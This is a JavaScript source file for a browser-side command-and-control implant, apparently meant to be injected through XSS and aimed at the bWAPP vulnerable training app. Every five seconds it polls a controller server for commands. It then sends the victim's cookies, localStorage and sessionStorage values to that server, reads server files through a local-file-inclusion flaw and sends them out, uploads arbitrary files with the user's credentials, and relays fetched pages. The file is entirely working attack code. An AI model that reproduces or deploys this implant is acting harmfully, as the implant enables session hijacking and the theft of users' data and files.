serverURL = "http://127.0.0.1:5000"
commandUrl = serverURL + "/getCommand"
saveSiteUrl = serverURL + "/saveSite"
var command = ""
var lfiFile = ""
var exit = false
var value = ""
var key = ""
var base64File = ""
var uploadFileName = ""
var contentType = ""
var site = ""

const COMMAND = "command"
const LFIFILE = "lfiFile"
const VALUE = "value"
const KEY = "key"
const BASE64FILE = "base64File"
const UPLOADFILENAME = "uploadFileName"
const CONTENTYPE = "contentType"
const SITE = "site"

function parseCommand (element) {
    element = element.split("=");
    if (element[0] == COMMAND) {
        command = element[1];
    }
    if (element[0] == LFIFILE) {
        lfiFile = element[1];
    }
    if (element[0] == VALUE) {
        value = element[1];
    }
    if (element[0] == KEY) {
        key = element[1];
    }
    if (element[0] == BASE64FILE) {
        base64File = element[1];
    }
    if (element[0] == UPLOADFILENAME) {
        uploadFileName = element[1];
    }
    if (element[0] == CONTENTYPE) {
        contentType = element[1];
    }
    if (element[0] == SITE) {
        site = element[1];
    }
}

function resetCommand(){
    command = "";
    lfiFile = "";
    value = "";
    key = "";
    base64File = "";
    uploadFileName = "";
    contentType = "";
    site = "";
}

async function getCommand() {
    let response = await fetch(commandUrl,{
        headers:
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
    let text = await response.text()
    splittedBody = text.split("&");
    splittedBody.forEach(function(element){
        parseCommand(element)
    });
}

async function runLFI() {
    var urlOfThePage = window.location.protocol + "//" + window.location.host
    lfiTarget = urlOfThePage + "/bWAPP/rlfi.php?language="+lfiFile+"&action=go";
    dataSaveUrl = serverURL + "/saveFile"
    let response = await fetch(lfiTarget);
    let data = await response.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');

    var text = htmlDoc.getElementById("main").innerText;
    fileContent = text.substring(text.indexOf('Go') + 2);
    console.log(lfiFile)
    await fetch(dataSaveUrl,{
        body: "fileContent=" + encodeURIComponent(fileContent) + "&fileName=" + encodeURIComponent(lfiFile),
        headers:
        {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
    })
}

function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

function fileUpload() {

    var b64file = base64File
    var blob = base64toBlob(b64file, contentType);

    var formData = new FormData();
    formData.append('file', blob, uploadFileName);
    formData.append('MAX_FILE_SIZE', 10);
    formData.append('form','Upload');

    var urlOfThePage = window.location.protocol + "//" + window.location.host
    var url = urlOfThePage + '/bWAPP/unrestricted_file_upload.php';
    xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.withCredentials = "true";

    xhr.send(formData);
}

function getCookie() {
    var url = serverURL + "/saveCookie";
    var body = "a=" + document.cookie;
    xr = new XMLHttpRequest();
    xr.open("POST", url, true);
    xr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    xr.send(body);
}

function setCookie() {
    document.cookie = key + "=" + value;
}

function getLocalStorage() {
    var data = window.localStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveLocalStorage?a=" +data;
}

function setLocalStorage() {
    localStorage.setItem(key, value)
}

function getSessionStorage() {
    var data = window.sessionStorage.getItem(key);
    var i=new Image;
    i.src= serverURL + "/saveSessionStorage?a=" + data;
}

function setSessionStorage() {
    sessionStorage.setItem(key, value)
}

async function getSite() {
    site = atob(site)
    const response = await fetch(site,{
        method: "GET"
    })
    let text = await response.text()

    downloadedSiteBase64URLEncoded = encodeURIComponent(btoa(text))
    postdata = "site=" + downloadedSiteBase64URLEncoded + "&" + "name=test.js"
    xhr = new XMLHttpRequest();
    xhr.open('POST', saveSiteUrl);
    xhr.withCredentials = "true";
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(postdata);
}

async function executeCommand() {
    if (command == "lfi") {
        await runLFI()
    }

    if (command == "fileUpload") {
        fileUpload()
    }

    if (command == "getCookie") {
        getCookie()
    }

    if (command == "setCookie") {
        setCookie()
    }

    if (command == "getLocalStorage") {
        getLocalStorage()
    }

    if (command == "setLocalStorage") {
        setLocalStorage()
    }

    if (command == "getSessionStorage") {
        getSessionStorage()
    }

    if (command == "setSessionStorage") {
        setSessionStorage()
    }

    if (command == "getSite") {
        await getSite()
    }

    resetCommand()
}

setInterval(function(){
    getCommand();
    executeCommand();
}, 5000);